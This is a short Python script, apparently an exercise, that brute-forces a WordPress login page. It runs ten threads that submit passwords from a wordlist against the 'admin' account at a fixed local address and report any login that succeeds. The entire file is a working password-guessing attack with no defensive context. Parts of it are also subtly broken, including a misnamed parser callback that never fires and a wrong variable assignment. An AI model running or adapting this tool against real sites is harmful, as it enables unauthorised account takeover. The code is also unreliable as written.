import urllib
import threading
import sys
import queue

from http.cookiejar import CookieJar
from html.parser import HTMLParser

num_thread = 10
username = "admin"
wordlist_file = "/tmp/cain.txt"
wp_url = "http://192.168.1.12/blog/wp-login.php"
success_check = "ダッシュボード"

class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}
        
    def handleshorttag(self,tag,attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
                    
            if tag_name is not None:
                self.tag_results[tag_name] = value
                
class Bruter(object):
    def __init__(self,username,words):
        self.username = username
        self.password_q = words
        self.found = False
    def run_bruteforce(self):
        for i in range(num_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()
    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip().decode('utf-8')
            jar = CookieJar()
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            response = opener.open(wp_url)
            page = response.read()
            
            print("trying: %s : %s" % (self.username,brute))
            
            parser = BruteParser()
            parser.feed(page.decode('utf-8'))
            post_tags = parser.tag_results
            post_tags["log"] = self.username
            post_tags["pwd"] = brute
            
            login_data = urllib.parse.urlencode(post_tags).encode('utf-8')
            login_request = urllib.request.Request(wp_url,login_data)
            login_response = opener.open(login_request)
            login_result = login_response.read().decode('utf-8')
            
            if success_check in login_result:
                self.found = True
                print(" Login Success!")
                print("Username: %s" % username)
                print("Password: %s" % brute)
                
def build_wordlist(wordlist_file):
    fp = open(wordlist_file,"rb")
    raw_words = fp.readlines()
    fp.close()
    words = queue.Queue()
    
    for word in raw_words:
        word = word.rstrip()
        words.put(word)
        
    return words

words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username,words)
bruter_obj.run_bruteforce()
